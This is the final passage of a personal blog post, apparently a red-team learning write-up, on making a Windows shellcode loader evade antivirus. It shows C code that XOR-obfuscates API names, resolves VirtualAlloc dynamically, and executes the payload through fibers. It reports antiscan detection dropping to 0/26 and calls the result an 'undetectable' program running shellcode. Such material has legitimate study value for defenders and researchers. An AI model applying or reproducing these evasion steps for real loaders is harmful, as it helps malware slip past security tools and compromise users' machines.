+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> __virtualalloc[] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0x17</span>, <span style="color:#ae81ff">0x2b</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x2b</span>, <span style="color:#ae81ff">0x09</span>, <span style="color:#ae81ff">0x25</span>, <span style="color:#ae81ff">0x26</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x00</span> };
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/// In obfuscators.h
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Decrypting XOR&#39;d function name
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>boUpJkYnxh29(__virtualalloc);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Getting handle to the function and appropriately typecasting it
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>_VirtualAlloc <span style="color:#f92672">=</span> (__type_virtualalloc)GetProcAddress(_kernel32, (LPCSTR)__virtualalloc);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Manage Error
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (_VirtualAlloc <span style="color:#f92672">==</span> NULL){
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// fprintf(stderr, &#34;Could not find VirtualAlloc in kernel32.dll\n&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/// In implant.cpp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Allocate a memory buffer for payload using new function
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>exec_mem <span style="color:#f92672">=</span> _VirtualAlloc(<span style="color:#ae81ff">0</span>, decoded_data_len, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (exec_mem <span style="color:#f92672">==</span> NULL){
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// fprintf(stderr, &#34;VirtualAlloc Failed with error code: %d\n&#34;, GetLastError());
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Once compiled, we can run <code>strings</code> from SysInternals to actually examine the resulting binary and notice that all the system function names previously being reflected in the output of the command are now gone.</p>
+<h3 id="antiscan-analysis-5" >Antiscan Analysis
+<span>
+    <a href="#antiscan-analysis-5">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>Adopting this, the analysis seems to be further lowered, bringing us even closer to zero detection</p>
+<p><a href="https://antiscan.me/scan/new/result?id=M2xQpE6PZckd"><strong>Antiscan Score: 1/26</strong></a></p>
+<p><img src="https://antiscan.me/images/result/M2xQpE6PZckd.png" alt="Level5 Analysis"></p>
+<h2 id="level-6---get-your-fibers-in" >Level 6 - Get your Fibers in!
+<span>
+    <a href="#level-6---get-your-fibers-in">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h2><p>Finally, we try alternative methods to execute shell code using <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/fibers">Fibers</a>, which is the minimal execution unit of a modern operating system. We convert the main thread running the program into a <code>Fiber</code> amd then create a new one from it and switch to the context of the newly created Fiber, much like what we used to do with threads.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/// In `implant.cpp`
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Convert main Thread to fiber
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>th <span style="color:#f92672">=</span> _ConvertThreadToFiber(NULL);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(th <span style="color:#f92672">==</span> NULL){
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// fprintf(stderr, &#34;ConvertThreadToFiber failed!\n&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>fiber <span style="color:#f92672">=</span> _CreateFiber(<span style="color:#ae81ff">0</span>, (LPFIBER_START_ROUTINE)exec_mem, NULL);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (fiber <span style="color:#f92672">==</span> NULL){
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// fprintf(stderr, &#34;CreateFiber Failed with error code: %d\n&#34;, GetLastError());
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_SwitchToFiber(fiber);
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span>....
+</span></span></code></pre></div><p>Compiling with the usual intructions gives us our final executable.</p>
+<h3 id="antiscan-analysis-6" >Antiscan Analysis
+<span>
+    <a href="#antiscan-analysis-6">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h3><p>This seems to do wonders as it brings the detection rates to zero(atleast at the time of writing this) and I guess we can say that we now have an undetectable sus-looking-program running our shellcode.</p>
+<p><a href="https://antiscan.me/scan/new/result?id=QEqWv42rdLiY"><strong>Antiscan Score: 0/26</strong></a></p>
+<p><img src="https://antiscan.me/images/result/QEqWv42rdLiY.png" alt="Level6 Analysis"></p>
+<h1 id="a-closing-word" >A closing word
+<span>
+    <a href="#a-closing-word">
+        <svg viewBox="0 0 28 23" height="100%" width="19" xmlns="http://www.w3.org/2000/svg"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" fill="none" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2"/></svg>
+    </a>
+</span>
+</h1><p>This blog series was heavily inspired by the <a href="https://institute.sektor7.net/view/courses/red-team-operator-malware-development-essentials/">Sektor 7&rsquo;s RED TEAM Operator: Malware Development Essentials Course</a> and was an amazing learning curve for me, who used to be shit scared of WinAPI and all that black magic. Yes, I did do my own research and built upon it, but I really, really recommend going through the Course if you want to get over the fear of WinAPI  like me :D</p>
+
+        </div>
+        
+
+    
+
+
+<div class="post-info">
+    
+        <div class="post-date dt-published">2022-08-20</div>
+    
+
+    <a class="post-hidden-url u-url" href="https://whokilleddb.github.io/blogs/posts/a_study_in_obfuscation/">https://whokilleddb.github.io/blogs/posts/a_study_in_obfuscation/</a>
+    <a href="https://whokilleddb.github.io/blogs/" class="p-name p-author post-hidden-author h-card" rel="me">whokilleddb</a>
+
+
+    <div class="post-taxonomies">
+        
+            
+    </div>
+</div>
+
+    </article>
+
+    
+        
+        
+    
+
+    
+        
+    <div class="pagination post-pagination">
+        <div class="left pagination-item disabled">
+            
+        </div>
+        <div class="right pagination-item ">
+            
+                <a href="/blogs/posts/dlink_dir-819_lfi_and_dos/">DLink DIR 819 LFI And DoS</a>
+            
+        </div>
+    </div>
+
+
+
+
+    
+
+    
+        
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "whokilleddb" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+
+
+
+
+
+    
+
+        </main>
+        
+            <footer class="common-footer">
+    
+    
+
+    <div class="common-footer-bottom">
+        
+        <div class="copyright">
+            <p>© whokilleddb, 2022<br>
+            Powered by <a target="_blank" rel="noopener noreferrer" href="https://gohugo.io/">Hugo</a>, theme <a target="_blank" rel="noopener noreferrer" href="https://github.com/mitrichius/hugo-theme-anubis">Anubis</a>.<br>
+            
+            </p>  
+        </div> 
+
+        
+
+    
+
+
+
+
+<script>
+const STORAGE_KEY = 'user-color-scheme'
+const defaultTheme = "dark-without-switcher"
+
+let currentTheme
+let switchButton
+let autoDefinedScheme = window.matchMedia('(prefers-color-scheme: dark)')
+
+const autoChangeScheme = e => {
+    currentTheme = e.matches ? 'dark' : 'light'
+    document.documentElement.setAttribute('data-theme', currentTheme)
+    changeButtonText()
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    switchButton = document.querySelector('.theme-switcher')
+    currentTheme = detectCurrentScheme()
+    if (currentTheme == 'dark') {
+        document.documentElement.setAttribute('data-theme', 'dark')
+    }
+    if (currentTheme == 'auto') {
+        autoChangeScheme(autoDefinedScheme);
+        autoDefinedScheme.addListener(autoChangeScheme);
+    }
+
+    if (switchButton) {
+        changeButtonText()
+        switchButton.addEventListener('click', switchTheme, false)
+    }
+  
+    showContent()
+})
+
+function detectCurrentScheme() {
+    if (localStorage.getItem(STORAGE_KEY)) {
+        return localStorage.getItem(STORAGE_KEY)
+    } 
+    if (defaultTheme) {
+        return defaultTheme
+    } 
+    if (!window.matchMedia) {
+        return 'light'
+    } 
+    if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        return 'dark'
+    }
+    return 'light'
+}
+
+function changeButtonText()
+{   
+    if (switchButton) {
+        switchButton.textContent = currentTheme == 'dark' ?  "Light theme" : "Dark theme"
+    }
+}
+
+function switchTheme(e) {
+    if (currentTheme == 'dark') {
+        localStorage.setItem(STORAGE_KEY, 'light')
+        document.documentElement.setAttribute('data-theme', 'light')
+        currentTheme = 'light'
+    } else {
+        localStorage.setItem(STORAGE_KEY, 'dark')
+        document.documentElement.setAttribute('data-theme', 'dark')
+        currentTheme = 'dark'
+    }
+    changeButtonText()
+}
+
+function showContent() {
+    document.body.style.visibility = 'visible';
+    document.body.style.opacity = 1;
+}
+</script>   
+    </div>
+
+    <p class="h-card vcard">
+
+    <a href=https://whokilleddb.github.io/blogs/ class="p-name u-url url fn" rel="me">whokilleddb</a> 
+
+     
+        /
+        <a class="p-email u-email email" rel="me" href="mailto:whokilleddb@protonmail.com">whokilleddb@protonmail.com</a>
+    
+
+     
+        <img class="u-photo" src="/images/avatar.png" />
+    
+</p> 
+</footer>
+
+        
+    </div>
+</body>
+</html>
